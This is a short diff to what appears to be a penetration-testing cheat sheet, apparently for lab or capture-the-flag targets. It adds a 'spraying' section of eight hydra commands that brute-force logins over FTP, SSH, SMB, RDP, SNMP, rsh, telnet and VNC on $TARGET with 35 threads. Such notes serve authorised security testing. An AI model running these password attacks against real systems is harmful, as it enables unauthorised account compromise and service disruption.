@@ -35,6 +35,16 @@ cat usernames | sed -n 's/.*\\//p' | cut -d ' ' -f 1
 ## hosts
 echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts
 
+## spraying
+hydra -L usernames -P passwords ftp://$TARGET -t35
+hydra -L usernames -P passwords ssh://$TARGET -t35
+hydra -L usernames -P passwords smb://$TARGET -t35
+hydra -L usernames -P passwords rdp://$TARGET -t35
+hydra -L usernames -P passwords snmp://$TARGET -t35
+hydra -L usernames -P passwords rsh://$TARGET -t35
+hydra -L usernames -P passwords telnet://$TARGET -t35
+hydra -L usernames -P passwords vnc://$TARGET -t35
+
 ## Web
 [*] Technology
 whatweb http://$TARGET
